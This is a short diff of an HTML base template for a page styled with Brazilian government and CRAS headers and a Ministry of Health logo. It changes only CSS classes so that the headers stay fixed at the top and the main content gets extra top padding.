@@ -187,7 +187,7 @@
 </head>
 <body class="flex flex-col min-h-screen bg-gray-50">
     <!-- Government Header -->
-    <header class="bg-[#222222] text-white py-2">
+    <header class="fixed top-0 left-0 right-0 z-50 bg-[#222222] text-white py-2">
         <div class="container mx-auto flex justify-between items-center px-4">
             <a class="font-bold text-sm" href="#">
                 <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
@@ -208,13 +208,13 @@
         </div>
     </header>
     <!-- CRAS Header -->
-    <div class="bg-[#fff] py-3">
+    <div class="fixed top-10 left-0 right-0 z-40 bg-[#fff] py-3 shadow-sm">
         <div class="container mx-auto px-4 text-left">
             <img src="https://cdn.jornalestadodegoias.com.br/wp-content/uploads/2022/06/ministerio-da-saude.png" alt="Logo CRAS" class="h-10 mx-auto" />
         </div>
     </div>
 
-    <main class="flex-grow container mx-auto px-4 py-8">
+    <main class="flex-grow container mx-auto px-4 py-8 pt-24">
         {% block content %}{% endblock %}
     </main>
 
